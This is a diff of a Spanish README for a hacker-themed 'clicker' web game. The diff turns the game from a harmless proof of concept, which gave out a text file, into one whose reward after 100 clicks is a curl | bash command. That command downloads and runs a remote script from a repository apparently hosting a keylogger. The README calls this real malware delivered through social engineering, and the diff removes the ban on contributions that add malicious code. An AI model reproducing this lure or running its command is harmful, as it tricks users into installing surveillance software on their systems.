@@ -1,20 +1,20 @@
 # Clicker Payload Delivery Service 🎯
 
-⚠️ **DISCLAIMER EDUCATIVO** ⚠️
+⚠️ **ADVERTENCIA CRÍTICA - MALWARE REAL** ⚠️
 
-Este repositorio contiene una **Prueba de Concepto (PoC)** educativa que demuestra cómo el malware puede ser entregado mediante técnicas de **ingeniería social**. El software se presenta como un juego tipo "Clicker" inocuo con temática de hacking.
+Este repositorio contiene una **demostración real** de cómo el malware puede ser entregado mediante técnicas de **ingeniería social**. El software se presenta como un juego tipo "Clicker" inocuo con temática de hacking, pero **ejecuta comandos reales** que instalan software en tu sistema.
 
 ## 🎮 Descripción
 
-**H4CK3R CLICKER** es una aplicación web interactiva que simula un juego de clicker con estética de terminal hacker. Al alcanzar 100 clicks, el usuario recibe una "recompensa" en forma de un archivo ejecutable llamado `not-a-virus-trust-me.exe`.
+**H4CK3R CLICKER** es una aplicación web interactiva que simula un juego de clicker con estética de terminal hacker. Al alcanzar 100 clicks, el usuario recibe un comando para ejecutar en su terminal que **instalará software real**.
 
 ### Características:
 
 - ✨ **Interfaz atractiva** con temática de hacking (estilo Matrix/terminal)
 - 🎯 **Sistema de progresión** con niveles de acceso (GUEST → USER → ADMIN → ROOT)
 - 💻 **Consola interactiva** con mensajes de "hacking" realistas
-- 📥 **Descarga de archivo** al completar 100 clicks
-- ⚠️ **Múltiples advertencias** en texto pequeño sobre los riesgos
+- 📋 **Comando curl** al completar 100 clicks que ejecuta un script real
+- ⚠️ **Advertencias** sobre los riesgos reales
 - 🎓 **Contenido educativo** explicando técnicas de ingeniería social
 
 ## 🎯 Propósito Educativo
@@ -56,7 +56,8 @@ npx http-server
 2. Observa cómo aumenta el contador de "HACKS EJECUTADOS"
 3. Tu nivel de acceso incrementará progresivamente
 4. Al llegar a 100 clicks, se revelará la sección de "recompensa"
-5. Podrás descargar el archivo `not-a-virus-trust-me.exe`
+5. Se mostrará un comando curl que puedes copiar y ejecutar
+6. **⚠️ ADVERTENCIA: El comando ejecuta un script real que instalará software en tu sistema**
 
 ### 🥚 Easter Egg
 Ingresa el código Konami para obtener acceso ROOT instantáneo:
@@ -77,27 +78,33 @@ Ingresa el código Konami para obtener acceso ROOT instantáneo:
 ## ⚠️ Advertencias Importantes
 
 ### Para Usuarios:
-- ❌ **NUNCA ejecutes archivos de fuentes no confiables**
+- ❌ **NUNCA ejecutes comandos de fuentes no confiables**
+- ❌ **Este proyecto ejecuta software real, no es una simulación**
 - ❌ **Verifica siempre la legitimidad** de los sitios web
 - ❌ **Desconfía de "recompensas" o "premios"** inesperados
-- ❌ **No desactives tu antivirus** por solicitud de aplicaciones
-- ✅ **Usa sandboxes** para probar archivos sospechosos
+- ❌ **No ejecutes comandos curl | bash sin revisar el script primero**
+- ✅ **Usa máquinas virtuales** para probar código sospechoso
 - ✅ **Mantén actualizado** tu software de seguridad
 
 ### Para Desarrolladores:
-- Este código es **solo para fines educativos**
-- **NO** debe usarse para distribuir malware real
-- **NO** debe modificarse para fines maliciosos
+- Este código es **para demostración de técnicas de ataque reales**
+- El comando proporcionado **ejecuta un script real**
+- **NO** debe usarse para distribuir malware sin consentimiento
 - Usar este concepto para dañar sistemas es **ilegal**
 
-## 🔒 Contenido del Archivo Descargado
+## 🔒 Contenido del Comando
 
-El archivo `not-a-virus-trust-me.exe` es un **archivo de texto** que contiene:
-- Información educativa sobre el PoC
-- Explicación de técnicas de ingeniería social
-- Lista de indicadores de amenazas
-- Consejos de protección
-- **NO contiene código malicioso real**
+El comando proporcionado es:
+```bash
+curl https://raw.githubusercontent.com/Jrgil20/KeyloggerEducativoParaLinuxX11/refs/heads/toInstall/scripts/downloadPentestingTool.sh | bash
+```
+
+Este comando:
+- **Descarga un script real** desde GitHub
+- **Lo ejecuta inmediatamente** con permisos de usuario
+- **Instala software en tu sistema**
+- Es un ejemplo real de cómo se distribuye malware mediante ingeniería social
+- **SOLO debe ejecutarse en entornos de prueba aislados**
 
 ## 🎓 Conceptos de Seguridad Demostrados
 
@@ -117,9 +124,10 @@ El archivo `not-a-virus-trust-me.exe` es un **archivo de texto** que contiene:
 - Exceso de confianza en la "legitimidad" visual
 
 ### 4. Delivery Mechanism (Mecanismo de Entrega)
-- Distribución directa de "ejecutables"
-- Requiere interacción del usuario (no drive-by)
-- Simula herramientas legítimas
+- Uso de comandos curl | bash para ejecución directa
+- Requiere interacción del usuario (copiar y pegar comando)
+- Bypass de controles de descarga tradicionales
+- Ejecución directa sin revisión del código
 
 ## 📚 Recursos Educativos
 
@@ -132,20 +140,20 @@ Para aprender más sobre seguridad cibernética:
 
 ## 🤝 Contribuciones
 
-Este es un proyecto educativo. Si deseas contribuir:
+Este es un proyecto de demostración de técnicas reales de ataque. Si deseas contribuir:
 - Mejoras en la documentación educativa
 - Ejemplos adicionales de vectores de ataque
 - Recursos de aprendizaje
 - Traducciones
 
 **NO** se aceptan contribuciones que:
-- Añadan código malicioso real
 - Oculten mejor las advertencias
-- Hagan la aplicación más engañosa sin propósito educativo
+- Hagan la aplicación más engañosa sin propósito educativo claro
+- Distribuyan malware sin el consentimiento explícito del usuario
 
 ## 📜 Licencia
 
-Este proyecto es de código abierto con fines **exclusivamente educativos**. El uso de este código para actividades maliciosas es **ilegal** y está **estrictamente prohibido**.
+Este proyecto demuestra técnicas reales de ingeniería social y distribución de malware con fines **exclusivamente educativos**. El uso de este código para actividades maliciosas sin consentimiento es **ilegal** y está **estrictamente prohibido**.
 
 ## 👨‍💻 Autor
 
